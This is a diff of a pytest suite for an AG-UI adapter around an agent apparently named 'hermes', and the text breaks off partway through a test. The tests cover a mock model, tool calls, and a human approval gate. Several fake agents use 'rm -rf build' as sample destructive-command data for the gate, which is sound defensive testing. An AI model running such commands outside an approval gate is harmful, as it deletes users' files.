@@ -27,6 +27,7 @@ from pathlib import Path
 import httpx
 import pytest
 import pytest_asyncio
+from tools import approval_context
 from ag_ui.core import (
     AssistantMessage,
     Context,
@@ -40,13 +41,28 @@ from ag_ui.core import (
 from httpx import ASGITransport
 
 _HERE = Path(__file__).resolve().parent
-_AIMOCK_CLI = _HERE / ".aimock" / "node_modules" / "@copilotkit" / "aimock" / "dist" / "cli.js"
+
+
+class _AgentLifecycle:
+    """Lifecycle contract shared by the deliberately minimal callback fakes."""
+
+    def close(self):
+        pass
+
+
+_AIMOCK_CLI = (
+    _HERE / ".aimock" / "node_modules" / "@copilotkit" / "aimock" / "dist" / "cli.js"
+)
 
 # Frontend tool the fixtures drive.
 CHANGE_BG = Tool(
     name="change_background",
     description="Set the page background.",
-    parameters={"type": "object", "properties": {"background": {"type": "string"}}, "required": ["background"]},
+    parameters={
+        "type": "object",
+        "properties": {"background": {"type": "string"}},
+        "required": ["background"],
+    },
 )
 
 # Deterministic server-side tool for the mixed-batch test.
@@ -59,55 +75,107 @@ ECHO_SCHEMA = {
 FIXTURES = {
     "fixtures": [
         # --- plain chat ------------------------------------------------------
-        {"match": {"userMessage": "AGUI_CHAT_PING"}, "response": {"content": "pong-from-hermes"}},
-
+        {
+            "match": {"userMessage": "AGUI_CHAT_PING"},
+            "response": {"content": "pong-from-hermes"},
+        },
         # --- frontend tool (two legs; toolCallId leg ordered FIRST) ----------
-        {"match": {"userMessage": "AGUI_FE_TOOL", "toolCallId": "call_fe_bg_1"},
-         "response": {"content": "FE_DONE background set"}},
-        {"match": {"userMessage": "AGUI_FE_TOOL"},
-         "response": {"toolCalls": [{"id": "call_fe_bg_1", "name": "change_background",
-                                     "arguments": {"background": "#123456"}}]}},
-
+        {
+            "match": {"userMessage": "AGUI_FE_TOOL", "toolCallId": "call_fe_bg_1"},
+            "response": {"content": "FE_DONE background set"},
+        },
+        {
+            "match": {"userMessage": "AGUI_FE_TOOL"},
+            "response": {
+                "toolCalls": [
+                    {
+                        "id": "call_fe_bg_1",
+                        "name": "change_background",
+                        "arguments": {"background": "#123456"},
+                    }
+                ]
+            },
+        },
         # --- mixed server + frontend (two legs) ------------------------------
-        {"match": {"userMessage": "AGUI_MIXED", "toolCallId": "call_fe_bg_2"},
-         "response": {"content": "MIXED_DONE both ran"}},
-        {"match": {"userMessage": "AGUI_MIXED"},
-         "response": {"toolCalls": [
-             {"id": "call_srv_1", "name": "echo_server", "arguments": {"text": "hi"}},
-             {"id": "call_fe_bg_2", "name": "change_background", "arguments": {"background": "#654321"}},
-         ]}},
-
+        {
+            "match": {"userMessage": "AGUI_MIXED", "toolCallId": "call_fe_bg_2"},
+            "response": {"content": "MIXED_DONE both ran"},
+        },
+        {
+            "match": {"userMessage": "AGUI_MIXED"},
+            "response": {
+                "toolCalls": [
+                    {
+                        "id": "call_srv_1",
+                        "name": "echo_server",
+                        "arguments": {"text": "hi"},
+                    },
+                    {
+                        "id": "call_fe_bg_2",
+                        "name": "change_background",
+                        "arguments": {"background": "#654321"},
+                    },
+                ]
+            },
+        },
         # --- server tool then narration (two legs) --------------------------
         # Leg 2 (tool result present): model narrates about the result. Ordered
         # FIRST so it wins once the echo_server result is in the request.
-        {"match": {"userMessage": "AGUI_SRV_TOOL", "toolCallId": "call_srv_only"},
-         "response": {"content": "The tool returned its answer."}},
+        {
+            "match": {"userMessage": "AGUI_SRV_TOOL", "toolCallId": "call_srv_only"},
+            "response": {"content": "The tool returned its answer."},
+        },
         # Leg 1: model calls the server-executed echo_server tool.
-        {"match": {"userMessage": "AGUI_SRV_TOOL"},
-         "response": {"toolCalls": [{"id": "call_srv_only", "name": "echo_server",
-                                     "arguments": {"text": "hi"}}]}},
-
+        {
+            "match": {"userMessage": "AGUI_SRV_TOOL"},
+            "response": {
+                "toolCalls": [
+                    {
+                        "id": "call_srv_only",
+                        "name": "echo_server",
+                        "arguments": {"text": "hi"},
+                    }
+                ]
+            },
+        },
         # --- context injection (gated on the injected system message) --------
-        {"match": {"userMessage": "AGUI_CTX", "systemMessage": "Ada Lovelace"},
-         "response": {"content": "CTX acknowledged Ada Lovelace"}},
-
+        {
+            "match": {"userMessage": "AGUI_CTX", "systemMessage": "Ada Lovelace"},
+            "response": {"content": "CTX acknowledged Ada Lovelace"},
+        },
         # --- forwarded_props (agent config) injection ------------------------
-        {"match": {"userMessage": "AGUI_PROPS", "systemMessage": "tone: pirate"},
-         "response": {"content": "PROPS acknowledged pirate"}},
-
+        {
+            "match": {"userMessage": "AGUI_PROPS", "systemMessage": "tone: pirate"},
+            "response": {"content": "PROPS acknowledged pirate"},
+        },
         # --- inbound shared state injection ----------------------------------
-        {"match": {"userMessage": "AGUI_STATE", "systemMessage": "Current shared state"},
-         "response": {"content": "STATE acknowledged recipe"}},
-
+        {
+            "match": {
+                "userMessage": "AGUI_STATE",
+                "systemMessage": "Current shared state",
+            },
+            "response": {"content": "STATE acknowledged recipe"},
+        },
         # --- state-writer tool: set_notes (two legs) -------------------------
         # Leg 2 (tool result present): model produces final text. Ordered
         # FIRST so it wins once the set_notes result is in the request.
-        {"match": {"userMessage": "AGUI_SET_NOTES", "toolCallId": "call_notes_1"},
-         "response": {"content": "NOTES saved"}},
+        {
+            "match": {"userMessage": "AGUI_SET_NOTES", "toolCallId": "call_notes_1"},
+            "response": {"content": "NOTES saved"},
+        },
         # Leg 1: model calls the server-executed state-writer tool.
-        {"match": {"userMessage": "AGUI_SET_NOTES"},
-         "response": {"toolCalls": [{"id": "call_notes_1", "name": "set_notes",
-                                     "arguments": {"notes": ["likes tea", "prefers dark mode"]}}]}},
+        {
+            "match": {"userMessage": "AGUI_SET_NOTES"},
+            "response": {
+                "toolCalls": [
+                    {
+                        "id": "call_notes_1",
+                        "name": "set_notes",
+                        "arguments": {"notes": ["likes tea", "prefers dark mode"]},
+                    }
+                ]
+            },
+        },
     ]
 }
 
@@ -120,9 +188,11 @@ SET_NOTES_PROPS = {
             "stateKey": "notes",
             "arg": "notes",
             "description": "Replace the notes array in shared state.",
-            "parameters": {"type": "object",
-                           "properties": {"notes": {"type": "array", "items": {"type": "string"}}},
-                           "required": ["notes"]},
+            "parameters": {
+                "type": "object",
+                "properties": {"notes": {"type": "array", "items": {"type": "string"}}},
+                "required": ["notes"],
+            },
         }
     ]
 }
@@ -170,7 +240,9 @@ def _echo_tool():
 @pytest.fixture(scope="module")
 def aimock(_echo_tool):
     if not _AIMOCK_CLI.exists():
-        pytest.skip(f"aimock not installed at {_AIMOCK_CLI} (run npm i in tests/agui_adapter/.aimock)")
+        pytest.skip(
+            f"aimock not installed at {_AIMOCK_CLI} (run npm i in tests/agui_adapter/.aimock)"
+        )
     fixtures_dir = _HERE / ".aimock" / "_fixtures_runtime"
     fixtures_dir.mkdir(parents=True, exist_ok=True)
     (fixtures_dir / "hermes.json").write_text(json.dumps(FIXTURES))
@@ -180,7 +252,8 @@ def aimock(_echo_tool):
     # so a PIPE could fill the OS pipe buffer and deadlock aimock mid-run.
     proc = subprocess.Popen(
         ["node", str(_AIMOCK_CLI), "-p", str(port), "-f", str(fixtures_dir)],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
     )
     try:
         _wait_port(port)
@@ -209,8 +282,11 @@ async def client(aimock):
 
     app = create_app(config)
     transport = ASGITransport(app=app)
-    async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1", timeout=60) as c:
-        yield c
+    async with app.router.lifespan_context(app):
+        async with httpx.AsyncClient(
+            transport=transport, base_url="http://127.0.0.1", timeout=60
+        ) as c:
+            yield c
 
 
 async def _run(client, run_input: RunAgentInput) -> list[dict]:
@@ -221,7 +297,7 @@ async def _run(client, run_input: RunAgentInput) -> list[dict]:
         assert resp.status_code == 200, resp.status_code
         async for line in resp.aiter_lines():
             if line.startswith("data:"):
-                events.append(json.loads(line[len("data:"):].strip()))
+                events.append(json.loads(line[len("data:") :].strip()))
     return events
 
 
@@ -229,11 +305,24 @@ def _types(events):
     return [e["type"] for e in events]
 
 
-def _input(messages, *, tools=None, context=None, state=None, forwarded_props=None,
-           thread="t1", run="r1") -> RunAgentInput:
+def _input(
+    messages,
+    *,
+    tools=None,
+    context=None,
+    state=None,
+    forwarded_props=None,
+    thread="t1",
+    run="r1",
+) -> RunAgentInput:
     return RunAgentInput(
-        thread_id=thread, run_id=run, state=state or {}, messages=messages,
-        tools=tools or [], context=context or [], forwarded_props=forwarded_props or {},
+        thread_id=thread,
+        run_id=run,
+        state=state or {},
+        messages=messages,
+        tools=tools or [],
+        context=context or [],
+        forwarded_props=forwarded_props or {},
     )
 
 
@@ -244,7 +333,9 @@ def _input(messages, *, tools=None, context=None, state=None, forwarded_props=No
 
 @pytest.mark.asyncio
 async def test_plain_chat_roundtrip(client):
-    events = await _run(client, _input([UserMessage(id="u1", role="user", content="AGUI_CHAT_PING")]))
+    events = await _run(
+        client, _input([UserMessage(id="u1", role="user", content="AGUI_CHAT_PING")])
+    )
     assert _types(events)[0] == "RUN_STARTED"
     assert _types(events)[-1] == "RUN_FINISHED"
     text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
@@ -255,7 +346,10 @@ async def test_plain_chat_roundtrip(client):
 async def test_frontend_tool_leg1_emits_call_and_ends(client):
     events = await _run(
         client,
-        _input([UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please")], tools=[CHANGE_BG]),
+        _input(
+            [UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please")],
+            tools=[CHANGE_BG],
+        ),
     )
     starts = [e for e in events if e["type"] == "TOOL_CALL_START"]
     assert len(starts) == 1
@@ -271,15 +365,39 @@ async def test_frontend_tool_leg1_emits_call_and_ends(client):
 
 @pytest.mark.asyncio
 async def test_frontend_tool_resume_with_result(client):
-    # Simulate the client having executed change_background and returning a result.
+    # Establish the live worker; an isolated tool-result request is an orphan.
+    first = await _run(
+        client,
+        _input(
+            [UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please")],
+            tools=[CHANGE_BG],
+        ),
+    )
+    assert "TOOL_CALL_START" in _types(first)
     messages = [
         UserMessage(id="u1", role="user", content="AGUI_FE_TOOL please"),
-        AssistantMessage(id="a1", role="assistant", content="",
-                         tool_calls=[ToolCall(id="call_fe_bg_1", type="function",
-                                              function=FunctionCall(name="change_background", arguments='{"background":"#123456"}'))]),
-        ToolMessage(id="tm1", role="tool", content='{"status":"success"}', tool_call_id="call_fe_bg_1"),
+        AssistantMessage(
+            id="a1",
+            role="assistant",
+            content="",
+            tool_calls=[
+                ToolCall(
+                    id="call_fe_bg_1",
+                    type="function",
+                    function=FunctionCall(
+                        name="change_background", arguments='{"background":"#123456"}'
+                    ),
+                )
+            ],
+        ),
+        ToolMessage(
+            id="tm1",
+            role="tool",
+            content='{"status":"success"}',
+            tool_call_id="call_fe_bg_1",
+        ),
     ]
-    events = await _run(client, _input(messages, tools=[CHANGE_BG]))
+    events = await _run(client, _input(messages, tools=[CHANGE_BG], run="r2"))
     text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
     assert "FE_DONE" in text
 
@@ -293,7 +411,10 @@ async def test_mixed_server_and_frontend_tool_calls(client):
     """
     events = await _run(
         client,
-        _input([UserMessage(id="u1", role="user", content="AGUI_MIXED go")], tools=[CHANGE_BG]),
+        _input(
+            [UserMessage(id="u1", role="user", content="AGUI_MIXED go")],
+            tools=[CHANGE_BG],
+        ),
     )
     starts = {e["toolCallName"]: e for e in events if e["type"] == "TOOL_CALL_START"}
     assert "echo_server" in starts and "change_background" in starts
@@ -311,17 +432,48 @@ async def test_mixed_server_and_frontend_tool_calls(client):
 
 @pytest.mark.asyncio
 async def test_mixed_resume_completes(client):
+    first = await _run(
+        client,
+        _input(
+            [UserMessage(id="u1", role="user", content="AGUI_MIXED go")],
+            tools=[CHANGE_BG],
+        ),
+    )
+    assert "TOOL_CALL_START" in _types(first)
     messages = [
         UserMessage(id="u1", role="user", content="AGUI_MIXED go"),
-        AssistantMessage(id="a1", role="assistant", content="",
-                         tool_calls=[
-                             ToolCall(id="call_srv_1", type="function", function=FunctionCall(name="echo_server", arguments='{"text":"hi"}')),
-                             ToolCall(id="call_fe_bg_2", type="function", function=FunctionCall(name="change_background", arguments='{"background":"#654321"}')),
-                         ]),
-        ToolMessage(id="tm_srv", role="tool", content="SERVER_OK", tool_call_id="call_srv_1"),
-        ToolMessage(id="tm_fe", role="tool", content='{"status":"success"}', tool_call_id="call_fe_bg_2"),
+        AssistantMessage(
+            id="a1",
+            role="assistant",
+            content="",
+            tool_calls=[
+                ToolCall(
+                    id="call_srv_1",
+                    type="function",
+                    function=FunctionCall(
+                        name="echo_server", arguments='{"text":"hi"}'
+                    ),
+                ),
+                ToolCall(
+                    id="call_fe_bg_2",
+                    type="function",
+                    function=FunctionCall(
+                        name="change_background", arguments='{"background":"#654321"}'
+                    ),
+                ),
+            ],
+        ),
+        ToolMessage(
+            id="tm_srv", role="tool", content="SERVER_OK", tool_call_id="call_srv_1"
+        ),
+        ToolMessage(
+            id="tm_fe",
+            role="tool",
+            content='{"status":"success"}',
+            tool_call_id="call_fe_bg_2",
+        ),
     ]
-    events = await _run(client, _input(messages, tools=[CHANGE_BG]))
+    events = await _run(client, _input(messages, tools=[CHANGE_BG], run="r2"))
     text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
     assert "MIXED_DONE" in text
 
@@ -364,7 +516,9 @@ async def test_frontend_context_injection(client):
         client,
         _input(
             [UserMessage(id="u1", role="user", content="AGUI_CTX who am i")],
-            context=[Context(description="the user's display name", value="Ada Lovelace")],
+            context=[
+                Context(description="the user's display name", value="Ada Lovelace")
+            ],
         ),
     )
     text = "".join(e["delta"] for e in events if e["type"] == "TEXT_MESSAGE_CONTENT")
@@ -448,14 +602,19 @@ def test_error_closes_open_lifecycles_before_run_error(monkeypatch):
     (TEXT_MESSAGE_END) BEFORE the terminal RUN_ERROR — otherwise the client
     sees a message stuck perpetually "streaming". The reported error message
     must be controlled (no raw exception text leaked)."""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def run_conversation(self, user_message, conversation_history=None):
@@ -464,9 +623,15 @@ def test_error_closes_open_lifecycles_before_run_error(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-err", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "hi"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-err",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "hi"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r = client.post("/", json=body)
@@ -480,7 +645,7 @@ def test_error_closes_open_lifecycles_before_run_error(monkeypatch):
 def test_fresh_run_rejected_while_approval_parked(monkeypatch):
     """A fresh (non-resume) run posted to a thread with a parked approval must
     be rejected with RUN_ERROR rather than racing/clobbering the parked run."""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter import approvals
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
@@ -494,10 +659,15 @@ def test_fresh_run_rejected_while_approval_parked(monkeypatch):
     # explicitly at the end instead of relying on the timeout firing in a window.
     monkeypatch.setattr(server, "_approval_timeout", lambda: 30.0)
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -505,15 +675,22 @@ def test_fresh_run_rejected_while_approval_parked(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
             return {"final_response": f"decision={decision}", "messages": []}
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "tp", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "tp",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
@@ -522,9 +699,15 @@ def test_fresh_run_rejected_while_approval_parked(monkeypatch):
 
         # A SECOND fresh run on the same thread (no resume) while the first
         # run's approval is still parked.
-        body2 = {"threadId": "tp", "runId": "r2", "state": {},
-                 "messages": [{"id": "m2", "role": "user", "content": "another message"}],
-                 "tools": [], "context": [], "forwardedProps": {}}
+        body2 = {
+            "threadId": "tp",
+            "runId": "r2",
+            "state": {},
+            "messages": [{"id": "m2", "role": "user", "content": "another message"}],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "RUN_ERROR" in r2.text
@@ -537,20 +720,21 @@ def test_fresh_run_rejected_while_approval_parked(monkeypatch):
         # since the worker's finally deliberately does NOT discard on a normal
         # resolve), then resolve its future. Run 2 was rejected via is_parked()
         # and did NOT consume the entry, so it is still present here.
-        parked = approvals.take("tp")
+        parked = client.app.state.executions.approvals.take("tp")
         assert parked is not None
         parked.pending.decision.set_result("deny")
         # Join the worker thread rather than polling is_parked, which flips
         # False at discard() BEFORE the worker posts its final events + DONE.
         import threading
+
         for _t in threading.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
-        assert not approvals.is_parked("tp")
+        assert not client.app.state.executions.approvals.is_parked("tp")
 
     # Clear any residual parked entry (belt-and-suspenders; the join+assert
     # above should already have observed it cleared).
-    approvals.take("tp")
+    client.app.state.executions.approvals.take("tp")
 
 
 def test_malformed_body_returns_400():
@@ -558,7 +742,9 @@ def test_malformed_body_returns_400():
     from fastapi.testclient import TestClient
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
-        r = client.post("/", content="not json", headers={"content-type": "application/json"})
+        r = client.post(
+            "/", content="not json", headers={"content-type": "application/json"}
+        )
         assert r.status_code == 400
 
 
@@ -566,12 +752,12 @@ def test_run_turn_sets_and_restores_interactive_context(monkeypatch):
     """`_run_turn` installs the approval context (interactive contextvar +
     thread-local approval callback) on the worker thread for the duration of
     the turn, and restores both afterward."""
-    import agui_adapter.server as server
+    from agui_adapter import server
 
     seen = {}
 
     # Stub build_run_agent → a fake agent that records the live approval context.
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
             self.stream_delta_callback = None
             self.reasoning_callback = None
@@ -580,7 +766,7 @@ def test_run_turn_sets_and_restores_interactive_context(monkeypatch):
             self.thinking_callback = None
 
         def run_conversation(self, user_message, conversation_history=None):
-            from tools.approval import _hermes_interactive_ctx
+            from tools.approval_context import _hermes_interactive_ctx
             from tools import terminal_tool
 
             seen["interactive"] = _hermes_interactive_ctx.get()
@@ -589,28 +775,38 @@ def test_run_turn_sets_and_restores_interactive_context(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    ri = RunAgentInput.model_validate({
-        "threadId": "t1", "runId": "r1", "state": {},
-        "messages": [{"id": "m1", "role": "user", "content": "hi"}], "tools": [],
-        "context": [], "forwardedProps": {},
-    })
+    ri = RunAgentInput.model_validate(
+        {
+            "threadId": "t1",
+            "runId": "r1",
+            "state": {},
+            "messages": [{"id": "m1", "role": "user", "content": "hi"}],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+        }
+    )
     bridge = server.AGUIEventBridge(lambda e: None)
-    server._run_turn(ri, server.AgentConfig(), bridge, {}, approval_cb=lambda *a, **k: "deny")
+    server._run_turn(
+        ri, server.AgentConfig(), bridge, {}, approval_cb=lambda *a, **k: "deny"
+    )
 
     assert seen["interactive"] == "1"  # set on the worker thread during the turn
     assert seen["cb_set"] is True
     # After the turn, the contextvar is reset.
-    from tools.approval import _hermes_interactive_ctx
+    from tools.approval_context import _hermes_interactive_ctx
+
     assert _hermes_interactive_ctx.get() in (None, "")
 
 
 def _first_interrupt_id(sse_text: str) -> str:
     import json
+
     for line in sse_text.splitlines():
         line = line.strip()
         if line.startswith("data:"):
             try:
-                obj = json.loads(line[len("data:"):].strip())
+                obj = json.loads(line[len("data:") :].strip())
             except Exception:
                 continue
             outcome = obj.get("outcome")
@@ -621,16 +817,21 @@ def _first_interrupt_id(sse_text: str) -> str:
 
 def test_interrupt_then_resume_runs_command_inline(monkeypatch):
     """Run 1 emits an interrupt outcome and parks; run 2 resumes and finishes."""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
     # Fake agent whose run_conversation calls the installed approval callback
     # (simulating a dangerous command hitting the gate), then "runs" it.
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -638,15 +839,22 @@ def test_interrupt_then_resume_runs_command_inline(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
             return {"final_response": f"decision={decision}", "messages": []}
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t9", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t9",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     # Use the context-manager form so both requests share ONE persistent event
     # loop (mirrors the single-uvicorn-worker invariant the parked queue relies
@@ -662,11 +870,22 @@ def test_interrupt_then_resume_runs_command_inline(monkeypatch):
         assert '"runId":"r1"' in r1.text.replace(" ", "")
 
         # Run 2: resume approving once.
-        body2 = {"threadId": "t9", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
-                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
+        body2 = {
+            "threadId": "t9",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": _first_interrupt_id(r1.text),
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "once"},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "decision=once" in r2.text  # the parked worker continued inline
@@ -676,6 +895,7 @@ def test_interrupt_then_resume_runs_command_inline(monkeypatch):
         # other resume tests; the worker's last act is emit(DONE), already
         # drained above, so this is immediate).
         import threading as _thr
+
         for _t in _thr.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
@@ -687,7 +907,7 @@ def test_interrupt_then_resume_deny_does_not_run_command(monkeypatch):
     executing the command. (Timeout→deny is covered by
     test_timeout_denies_and_clears_registry; this is the common user-driven
     deny that the approve test's sibling was missing.)"""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
@@ -698,10 +918,15 @@ def test_interrupt_then_resume_deny_does_not_run_command(monkeypatch):
 
     ran = {"executed": False}
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -709,6 +934,7 @@ def test_interrupt_then_resume_deny_does_not_run_command(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             decision = cb("rm -rf build", "deletes build dir") if cb else "deny"
             if decision != "deny":
@@ -719,27 +945,45 @@ def test_interrupt_then_resume_deny_does_not_run_command(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-deny", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-deny",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
         assert r1.status_code == 200
         assert '"type":"interrupt"' in r1.text.replace(" ", "")
 
-        body2 = {"threadId": "t-deny", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
-                             "status": "resolved", "payload": {"approved": False}}]}
+        body2 = {
+            "threadId": "t-deny",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": _first_interrupt_id(r1.text),
+                    "status": "resolved",
+                    "payload": {"approved": False},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "decision=deny" in r2.text  # worker unblocked with a deny
-        assert ran["executed"] is False    # and never ran the command
+        assert ran["executed"] is False  # and never ran the command
         assert '"type":"success"' in r2.text.replace(" ", "")
         assert "RUN_ERROR" not in r2.text
         import threading as _thr
+
         for _t in _thr.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
@@ -765,7 +1009,7 @@ def test_interrupt_via_real_guard_dispatcher_end_to_end(monkeypatch):
     True, the command would divert to the gateway fallback, and the run-1
     interrupt assertion below would fail — so this single flow proves both the
     no-platform bootstrap AND the env-neutralization are load-bearing."""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter import approvals
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
@@ -773,16 +1017,21 @@ def test_interrupt_via_real_guard_dispatcher_end_to_end(monkeypatch):
 
     # Deterministic manual approval mode + park timeout with comfortable margin
     # (the resume lands in ~tens of ms; the timeout is only a safety ceiling).
-    monkeypatch.setattr(approval, "_get_approval_mode", lambda: "manual")
+    monkeypatch.setattr(approval_context, "_get_approval_mode", lambda: "manual")
     monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)
     # Inherited gateway/ask env that MUST be neutralized by create_app().
     monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
     monkeypatch.setenv("HERMES_EXEC_ASK", "1")
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -793,14 +1042,21 @@ def test_interrupt_via_real_guard_dispatcher_end_to_end(monkeypatch):
             # the thread-local callback that _run_turn installed on this thread.
             cb = terminal_tool._get_approval_callback()
             res = approval.check_all_command_guards(
-                "rm -rf build", env_type="local", approval_callback=cb)
+                "rm -rf build", env_type="local", approval_callback=cb
+            )
             return {"final_response": f"approved={res.get('approved')}", "messages": []}
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-real", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-real",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
@@ -809,30 +1065,51 @@ def test_interrupt_via_real_guard_dispatcher_end_to_end(monkeypatch):
         # submit_pending fallback, which emits no interrupt).
         assert '"type":"interrupt"' in r1.text.replace(" ", "")
 
-        body2 = {"threadId": "t-real", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
